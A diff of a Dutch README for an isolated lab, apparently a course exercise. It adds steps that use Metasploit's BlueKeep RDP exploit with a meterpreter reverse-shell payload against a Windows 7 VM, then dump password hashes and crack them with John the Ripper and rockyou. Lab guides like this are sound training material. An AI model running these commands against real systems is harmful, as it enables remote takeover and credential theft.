@@ -25,7 +25,7 @@ Set-ExecutionPolicy Unrestricted
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
 
-### Stap 1: aanmeken Windows7-VM
+### Stap 1: Aanmaken Windows7-VM
 
 - Start het `create_win7_vm.ps1` script
 - Volg de installatie (klik enkele keren op "Next") en wacht tot Windows volledig geïnstalleerd is.
@@ -49,7 +49,7 @@ powershell -ExecutionPolicy Bypass -File \enable_rdp.ps1
 
 Zodra de Windows 7 VM klaarstaat, moet je er niets meer aan aanpassen. We gaan nu voortdoen met het opzetten van de Kali VM.
 
-### Stap 1:  Netwerkconfiguratie
+### Stap 1: Netwerkconfiguratie
 **Zorgen dat beide VMs in hetzelfde interne netwerk zitten**
 
 - Verander in de VirtualBox settings op je Host-Computer:
@@ -65,24 +65,37 @@ sudo ip addr add 10.10.10.3/24 dev eth1
 sudo ip link set eth1 up
 ```
 
-### Stap 2: Start Metasploit
+### Stap 2: Metasploit
+
+**Metasploit-aanval opstarten**
 
 ```bash
+# dit commando voer je gewoon uit in de linux-terminal
 msfconsole
+
+# Vervolgens voer je op de metasploit-CLI volgende commando's uit (de commando's beginnen pas na de >)
+
+msf6 > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+sf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> set RHOSTS 10.10.10.2
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> set LHOST 10.10.10.3
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> set LPORT 4444
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> set TARGET 1
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce)> run
 ```
 
-- Laad vervolgens het Bluekeep exploit:
+Als je al dit goed hebt uitgevoerd, zit je nu in de meterpreter-console
 
-```
-exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+### Stap 3: meterpreter console gebruiken om wachtwoorden te kraken
+1. Op de kali VM kan je via de meterpreter console nu de hashdumps van Windows opvragen
 
-set RHOSTS 10.10.10.2
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 10.10.10.3
-set LPORT 4444
-set TARGET 1
-run
+```bash
+meterpreter > hashdump
 ```
 
-- Als alles correct is ingesteld, opent er zich een Meterpreter sessie waarmee je het systeem kunt overnemen.
+2. De output van deze command kan je dan opslaan in dit bestand `~/cybersec/hashdump_win7.txt`
+3. Vervolgens ga je de rockyou.txt wordlist nodig hebben, moet je misschien eerst unzippen met `gunzip /usr/share/wordlists/rockyou.txt.gz`
+4. Vervolgens kan je dit commando runnen om het te kraken `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/cybersec/hashdump_win7.txt` 
+5. Hieruit zie je dan dat het wachtwoord bv. "superman" is van de Administrator 
